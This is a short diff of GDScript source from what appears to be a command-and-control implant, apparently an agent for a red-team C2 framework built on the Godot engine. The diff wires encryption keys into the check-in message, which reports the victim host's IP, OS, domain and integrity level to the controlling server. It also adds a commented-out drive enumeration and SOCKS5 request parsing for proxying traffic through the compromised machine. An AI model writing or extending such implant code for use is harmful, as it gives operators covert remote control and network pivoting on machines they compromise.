@@ -71,7 +71,13 @@ func _send_checkin():
 		else:
 			ip = upnp.query_external_address()
 
+		# TODO: someday?
+		#var drives = ""
+		#for idx in DirAccess.get_drive_count():
+		#	drives += DirAccess.get_drive_name(idx) + "\n"
+
 		_sent_checkin_already = protocol.send(JSON.stringify({
+			#"user_output": drives,
 			"action": "checkin", # requiredupnp.queryexternaladdress(), #",".join(IP.get_local_addresses()), # internal ip address - required
 			"ip": ip,
 			"os": os, # os version - required
@@ -84,8 +90,8 @@ func _send_checkin():
 			"domain": userdomain, # domain of the host - optional
 			"integrity_level": 3, # integrity level of the process - optional
 			#"external_ip": "8.8.8.8", # external ip if known - optional
-			"encryption_key": "", # encryption key - optional
-			"decryption_key": "", # decryption key - optional
+			"encryption_key": config.get_ek(),
+			"decryption_key": config.get_dk(), # decryption key - optional
 		}), true)
 	else:
 		print("no transport protocol set - bailing on checkin...")
@@ -202,9 +208,14 @@ func handle_socks(parameters):
 	else:
 		# new connection
 		if data != null and not do_exit:
-			socks_connection[server_id] = TransportSocks.new(self, server_id, data)
+			socks_connection[server_id] = TransportSocks.new(self, server_id)
 			add_child(socks_connection[server_id]) # s.t. the _process is called every frame?
-			set_realtime(true)
+
+			if await socks_connection[server_id].parse_socks5_request(data):
+				set_realtime(true)
+			else:
+				remove_child(socks_connection[server_id])
+				socks_connection.erase(server_id)
 
 	if socks_connection.size() <= 0:
 		set_realtime(false)
